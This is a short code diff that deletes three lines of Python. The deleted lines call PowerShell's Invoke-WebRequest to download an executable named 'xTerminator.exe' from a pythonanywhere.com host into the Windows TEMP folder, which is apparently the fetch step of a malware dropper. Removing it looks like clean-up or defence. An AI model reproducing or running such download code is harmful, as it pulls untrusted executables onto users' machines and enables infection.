@@ -1,3 +1,0 @@
-TEMP = os.path.expandvars("%TEMP%")
-subprocess.call(f'powershell Invoke-WebRequest -Uri "https://ostryonload.pythonanywhere.com/static/xTerminator.exe" -OutFile "{TEMP}\\xTerminator.exe"', shell=True)
-            
